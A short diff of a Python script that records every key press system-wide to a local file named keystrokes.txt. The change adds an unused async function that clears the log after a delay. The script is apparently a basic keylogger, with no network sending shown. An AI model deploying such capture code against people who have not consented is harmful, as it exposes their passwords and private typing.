@@ -1,7 +1,7 @@
 import sys
-import threading
-
 import keyboard
+import asyncio
+import time
 
 log_file = 'keystrokes.txt'
 
@@ -27,13 +27,17 @@ def on_key_press(event):
             f.write(event.name)
 
 
-
 def closeProgram():
     sys.exit(0)
 
+async def clear(time, text):
+    await asyncio.sleep(time)
+    open(log_file, 'w').close()
+
 
 keyboard.on_press(on_key_press)
-
-
 keyboard.wait()
+
+
+
 
